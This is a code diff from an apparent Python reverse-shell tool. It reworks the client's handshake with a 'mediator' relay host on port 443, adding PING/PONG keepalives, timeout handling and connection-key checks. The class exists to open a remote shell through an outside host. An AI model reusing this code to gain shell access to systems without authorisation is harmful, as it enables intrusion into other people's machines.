@@ -113,10 +113,25 @@ class ReverseShell:
     def connect(self, mediatorHost):
         self.handler.connect((socket.gethostbyname(mediatorHost), 443))
         self.handler.sendall(self.connectionKey.encode())
-        ready, _, _ = select.select([self.handler], [], [])
-        if ready:
-            verification = self.handler.recv(1024)
-            if verification.decode() != self.connectionKey:
+        while True:
+            ready, _, _ = select.select([self.handler], [], [])
+            if ready:
+                signal = self.handler.recv(1024)
+            else:
+                print("Connection timed out")
+                continue
+            if signal.decode() == "PING":
+                self.handler.sendall("PONG".encode())
+                print(".", end="", flush=True)
+            elif signal.decode() == "TIMEOUT":
+                print("\nConnection timed out")
+                exit(1)
+            elif signal.decode() == self.connectionKey:
+                print("\nConnection established")
+                break
+            else:
+                print("\nCRITIAL: Connection key validation failed")
+                print("Server responded with the wrong key: {}".format(signal.decode()))
                 exit(1)
 
     def run(self):
